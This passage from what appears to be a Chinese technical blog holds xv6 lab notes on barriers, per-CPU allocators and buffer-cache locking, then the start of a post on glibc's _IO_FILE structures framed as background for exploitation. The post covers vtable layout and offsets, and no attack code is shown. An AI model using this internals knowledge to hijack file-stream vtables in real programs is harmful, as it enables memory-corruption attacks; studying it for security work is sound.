<li>barrier_init(): 初始化barrier结构体</li>
<li>barrier(): 需要实现每个线程在barrier中阻塞，直到nthreads的所有线程都调用barrier</li>
</ul>
</li>
<li>thread中有一个循环，每次循环都会执行barrier</li>
</ul>
<p>需要使用到两个函数:</p>
<ul>
<li>pthread_cond_wait(pthread_cond_t *cond, pthread_mutex_t *mutex): 该函数会自动释放锁mutex并在被唤醒时重新获取，然后使调用线程在cond上休眠</li>
<li>pthread_cond_broadcast(pthread_cond_t *cond): 唤醒cond上的所有线程</li>
</ul>
<p>目标:</p>
<ul>
<li>每当所有线程执行一轮barrier，都增加一次round</li>
<li>每一个线程执行barrier时都记录一次nthread，并当nthread等于总线程时全部唤醒，一个线程重复进入barrier不会增加nthread</li>
</ul>
<p>这个实现简单多了，由于barrier结构体属于共享资源，是临界区，所以在修改nthread和round时需要上锁。然后每次执行增加nthread，并在唤醒后置0并round++。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">barrier</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pthread_mutex_lock(&amp;bstate.barrier_mutex); ‣mutex: &amp;bstate.barrier_mutex</span><br><span class="line">  bstate.nthread++;</span><br><span class="line">  <span class="keyword">if</span>(bstate.nthread==nthread)&#123;</span><br><span class="line">    pthread_cond_broadcast(&amp;bstate.barrier_cond); ‣cond: &amp;bstate.barrier_cond</span><br><span class="line">    bstate.round++;</span><br><span class="line">    bstate.nthread=<span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    pthread_cond_wait(&amp;bstate.barrier_cond,&amp;bstate.barrier_mutex); ‣cond: &amp;<span class="function">bst</span></span><br><span class="line"><span class="function">  <span class="title">pthread_mutex_unlock</span><span class="params">(&amp;bstate.barrier_mutex)</span></span>; ‣mutex: &amp;bstate.barrier_mutex</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Lab7-Locks"><a href="#Lab7-Locks" class="headerlink" title="Lab7: Locks"></a>Lab7: Locks</h1><h2 id="Memory-allocator"><a href="#Memory-allocator" class="headerlink" title="Memory allocator"></a>Memory allocator</h2><p>实现每个CPU的空闲列表，并在该列表为空是从其他地方窃取另一个CPU空闲列表的一部分。</p>
<p>根据实验描述和提示:</p>
<ol>
<li>使用freerange将空闲内存页分配到各个调用freerange的CPU中<ul>
<li>freerange就是将所有物理地址释放，kfree会将该内存也放入freelist中</li>
</ul>
<ol>
<li>也就是说，我们需要先为每个CPU创建一个空闲列表(kmem)</li>
<li>然后修改freerange和kfree，使其将释放的内存，全部放入当前CPU的freelist中</li>
</ol>
</li>
<li>接着需要从其他空闲列表中窃取空闲页，直接偷完会报错，只偷一个就好了</li>
</ol>
<p>首先是freelist，将kalloc中的kmem复制过来就行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">proc</span>;</span>          <span class="comment">// The process running on this cpu, or null.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// swtch() here to enter scheduler().</span></span><br><span class="line">  <span class="keyword">int</span> noff;                   <span class="comment">// Depth of push_off() nesting.</span></span><br><span class="line">  <span class="keyword">int</span> intena;                 <span class="comment">// Were interrupts enabled before push_off()?</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">	&#125; kmem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>接着说kalloc.c文件中的相关函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;NCPU;i++)</span><br><span class="line">    initlock(&amp;cpus[i].kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct run*)pa;</span><br><span class="line"></span><br><span class="line">  push_off();</span><br><span class="line">  <span class="keyword">int</span> cur=cpuid();</span><br><span class="line">  acquire(&amp;cpus[cur].kmem.lock);</span><br><span class="line">  r-&gt;next = cpus[cur].kmem.freelist;</span><br><span class="line">  cpus[cur].kmem.freelist = r;</span><br><span class="line">  release(&amp;cpus[cur].kmem.lock);</span><br><span class="line">  pop_off();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">steal</span><span class="params">(<span class="keyword">int</span> cur)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span>* <span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;NCPU;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i==cur)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    acquire(&amp;cpus[i].kmem.lock);</span><br><span class="line">    r=cpus[i].kmem.freelist;</span><br><span class="line">    <span class="keyword">if</span>(r)&#123;</span><br><span class="line">      cpus[cur].kmem.freelist=r;</span><br><span class="line">      cpus[i].kmem.freelist=r-&gt;next;</span><br><span class="line">      r-&gt;next=<span class="number">0</span>;</span><br><span class="line">      release(&amp;cpus[i].kmem.lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    release(&amp;cpus[i].kmem.lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  push_off();</span><br><span class="line">  <span class="keyword">int</span> cur=cpuid();</span><br><span class="line">  acquire(&amp;cpus[cur].kmem.lock);</span><br><span class="line">  r = cpus[cur].kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    cpus[cur].kmem.freelist = r-&gt;next;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    steal(cur);</span><br><span class="line">    r = cpus[cur].kmem.freelist;</span><br><span class="line">    <span class="keyword">if</span>(r)</span><br><span class="line">      cpus[cur].kmem.freelist = r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;cpus[cur].kmem.lock);</span><br><span class="line">  pop_off();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>steal功能主要是将一个节点从链表中取出并放入另一个链表。</p>
<h2 id="Buffer-cache"><a href="#Buffer-cache" class="headerlink" title="Buffer cache"></a>Buffer cache</h2><p>该实验是要完善bcache，减少使用中发生的锁的竞争，</p>
<p>bcache是一个保存缓存字符的结构体，其中包括一个lock，用来保护不变量(head中的prev指向链表首部，next执行链表尾部)，一个缓冲区(struct buf)buf，一个链表头head用来将buf中的内容链起来，head不是指针，但里面也没有除了prev及next指针外的内容，感觉是一种浪费。</p>
<p>由于bget中使用遍历buf链表来获取指定block的缓冲区地址，若缓冲区中有保存则直接返回该缓冲区地址;若没有则会链表中插入block对应缓冲区的内容，在这个过程中需要给bcache上锁，很明显这是很奢侈的行为(临界区为循环)，所以我们可以使用粒度更细的锁或使用睡眠锁，正好head中的lock满足后者。</p>
<p>由于这时候我还没读完题目，直接就换个锁(一共就改了三行)，然后执行bcachetest确实是通过了grade，但是后来看到提示好像我想的太简单了(虽然我感觉没问题，head中的其他字段本来也是浪费的)。实验建议我们使用哈希表来存储缓冲区，通过查询块号来获取对应缓冲区与其锁。<em>使用哈希表来存储的意义在于，不用遍历整个表，而只需要得到哈希后的key即可访问对于链表，然后每个链表都有一个锁。</em></p>
<p>继续跟着提示来完成实验:</p>
<ul>
<li><p>使用固定数目的桶，而不动态调整哈希表的大小，并且使用素数个数(13)的桶来降低散列冲突的可能性</p>
</li>
<li><p>从该哈希表中查找缓冲区，并且当该缓冲区未被查找到时需要给这个缓冲区在哈希表中创建一个索引</p>
</li>
<li><p>删除缓冲区链表，并且不使用LRU(least recently used)来获取任意一个引用为0的缓冲区。</p>
<ol>
<li>首先创建一个哈希表，并清除使用的，哈希函数使用简单的取模。</li>
</ol>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">define</span> NBKT 13</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">define</span> hash(x) (x%NBKT)</span></span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bbucket</span>&#123;</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"> 	<span class="comment">//struct spinlock lock;</span></span><br><span class="line"> 	<span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bbucket</span> <span class="title">btable</span>[<span class="title">NBKT</span>];</span></span><br><span class="line">&#125; bcache;</span><br></pre></td></tr></table></figure>

<p>  bucket中的head不使用指针，是为了方便一些，可以直接使用原本代码，不需要大量修改。</p>
<ol start="2">
<li>并在binit中初始化bucket。</li>
</ol>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"> <span class="title">binit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//initlock(&amp;bcache.lock, &quot;bcache&quot;);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Create linked list of buffers</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;NBKT;i++)&#123;</span><br><span class="line">	  bcache.btable[i].head.prev = &amp;bcache.btable[i].head;</span><br><span class="line">	  bcache.btable[i].head.next = &amp;bcache.btable[i].head;</span><br><span class="line">	  initlock(&amp;bcache.btable[i].lock,<span class="string">&quot;btable&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(b = bcache.buf; b &lt; bcache.buf+NBUF; b++)&#123;</span><br><span class="line">	  b-&gt;prev=bcache.btable[<span class="number">0</span>].head.prev;</span><br><span class="line">	  b-&gt;next=&amp;bcache.btable[<span class="number">0</span>].head;</span><br><span class="line">	  b-&gt;prev-&gt;next=b;</span><br><span class="line">	  b-&gt;next-&gt;prev=b;</span><br><span class="line">	  initsleeplock(&amp;b-&gt;lock, <span class="string">&quot;buffer&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>在bget中使用串行化回收</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line"> <span class="keyword">int</span> bkey=hash(blockno);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//acquire(&amp;bcache.lock);</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Is the block already cached?</span></span><br><span class="line"> acquire(&amp;bcache.btable[bkey].lock);</span><br><span class="line"> <span class="keyword">for</span>(b = bcache.btable[bkey].head.next; b != &amp;bcache.btable[bkey].head; b = b-&gt;next)&#123;</span><br><span class="line">   <span class="keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span><br><span class="line">     b-&gt;refcnt++;</span><br><span class="line">     acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">     <span class="comment">//release(&amp;bcache.lock);</span></span><br><span class="line">     release(&amp;bcache.btable[bkey].lock);</span><br><span class="line">     <span class="keyword">return</span> b;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> release(&amp;bcache.btable[bkey].lock);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Not cached.</span></span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;NBKT;i++)&#123;</span><br><span class="line">   acquire(&amp;bcache.btable[i].lock);</span><br><span class="line">   <span class="keyword">for</span>(b = bcache.btable[i].head.prev; b != &amp;bcache.btable[i].head; b = b-&gt;prev)&#123;</span><br><span class="line">     <span class="keyword">if</span>(b-&gt;refcnt == <span class="number">0</span>) &#123;</span><br><span class="line">        b-&gt;dev = dev;</span><br><span class="line">        b-&gt;blockno = blockno;</span><br><span class="line">        b-&gt;valid = <span class="number">0</span>;</span><br><span class="line">        b-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        b-&gt;prev-&gt;next=b-&gt;next;</span><br><span class="line">        b-&gt;next-&gt;prev=b-&gt;prev;</span><br><span class="line">        b-&gt;prev=bcache.btable[bkey].head.prev;</span><br><span class="line">        b-&gt;next=&amp;bcache.btable[bkey].head;</span><br><span class="line">        b-&gt;prev-&gt;next=b;</span><br><span class="line">        b-&gt;next-&gt;prev=b;</span><br><span class="line"></span><br><span class="line">        acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">        <span class="comment">//release(&amp;bcache.lock);</span></span><br><span class="line">        release(&amp;bcache.btable[i].lock);</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    release(&amp;bcache.btable[i].lock);</span><br><span class="line">  &#125;</span><br><span class="line">  panic(<span class="string">&quot;bget: no buffers&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  串行化回收也就是同时仅有一个cpu在回收该链表，因此需要获取链表锁。</p>
</li>
<li><p>最后再修改其他函数(使用了bcache锁)</p>
</li>
</ul>
<p><em>在实验时保留bcache中的锁并且最后在给各部分加锁对于完成实验更加方便。</em></p>
<p>另外，踩了一个坑: 我一开始以为，没有了全局锁后在访问缓冲区前就需要获取缓冲区的睡眠锁。后来想明白，因为同一时刻只会有一个cpu访问一个链表(缓冲区的修改需要先获取链表锁，给忘了)，甚至于缓存区的睡眠锁在该锁外获取都行(8.3节)。而且整个实验中使用的比较多的是链表锁且不能使用缓冲区的睡眠锁(不能使用缓冲区锁的地方还有bpin和bunpin中)。对于这个缓冲区锁我还是有疑惑。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>FILE结构及利用</title>
    <url>/2022/07/27/FILE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>FILE结构体概述</p>
<span id="more"></span>

<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>_IO_FILE 结构体在程序执行 fopen 等函数时会被创建，并分配在堆中。</p>
<p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr，这三个文件流不会分配到堆上。可以在 libc.so 中找到这些符号，它们指向各自 _IO_FILE 结构体的指针，而 IO_FILE 结构体真正的符号是 _IO_2_1_stderr_、_IO_2_1_stdout_、_IO_2_1_stdin_(即 stdout -&gt; _IO_2_1_stdout_)。</p>
<p>_IO_FILE 结构体一般处于 _IO_FILE_plus 中，_IO_FILE_plus 中还包含着 一个 IO_jump_t 类型指针 vtable。该结构类型中的成员是一些函数指针。</p>
<h3 id="结构体源码"><a href="#结构体源码" class="headerlink" title="结构体源码"></a>结构体源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/libio.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="flags"><a href="#flags" class="headerlink" title="_flags"></a>_flags</h4><p>该标志的高两字节是由libc固定的，标志这个文件的类型，一般为<code>0xfbad</code>；低两字节决定程序的执行状态。<br>不同状态对应的二进制码如下(十六进制表示)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>

<h4 id="缓冲区指针"><a href="#缓冲区指针" class="headerlink" title="缓冲区指针"></a>缓冲区指针</h4><p>各缓冲区指针的作用是在缓冲区中划分的一个范围：</p>
<ul>
<li>_IO_buf_base 指向文件流缓冲区的起始位置<br>_IO_buf_end 指向文件流缓冲区的结束位置</li>
<li>_IO_read_base 指向缓冲区中的待读出数据的起始位置<br>_IO_read_end 指向缓冲区中的待读出数据的结束位置<br>_IO_read_ptr 指向缓冲区中待读出数据的当前位置<ul>
<li>我们将 _IO_read_base 与 _IO_read_end 之间的缓冲区称为输入缓冲区</li>
</ul>
</li>
<li>_IO_write_base 指向缓冲区中待写入的起始位置<br>_IO_write_end 指向缓冲区中待写入的结束位置<br>_IO_write_ptr 指向缓冲区中待写入数据的当前位置<ul>
<li>我们将 _IO_write_base 与 _IO_write_end 之间的缓冲区称为输出缓冲区</li>
</ul>
</li>
</ul>
<p>vtable 相对于 _IO_FILE 结构体的偏移是固定的，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。(即相应 _IO_FILE 结构体的长度)<br>_IO_FILE 结构体之间通过 _chain 来链接，链表的头部是 _IO_list_all，每个 chain 指向下一个文件流的 _flags(每个文件流的首地址)，_IO_list_all 指向 stderr 的 _flags。</p>
<h4 id="vtable"><a href="#vtable" class="headerlink" title="vtable"></a>vtable</h4><p>虚表指针，指向一个_IO_jump_t结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中指向了各种函数，我们对文件流的 orw 都是调用的这个表中的指针指向的函数。简单说下调用这些函数时的流程：</p>
<h5 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fread</span><span class="params">( <span class="keyword">void</span> *buffer, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> count, FILE *stream)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li>buffer 存放读取数据的缓冲区。</li>
<li>size：指定每个记录的长度。</li>
<li>count： 指定记录的个数。</li>
<li>stream：目标文件流。</li>
</ul>
<p>返回值：返回读取到数据缓冲区中的记录个数</p>
<p>__read 指向的是 _IO_fread 函数，该函数位于 /libio/iofread.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t _IO_fread (<span class="keyword">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t bytes_requested = size * count;</span><br><span class="line">  _IO_size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="keyword">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>_IO_fread 函数很短，实际上功能是由 _IO_sgetn 函数实现的， _IO_sgetn 位于 glibc/libio/genops.c。</p>
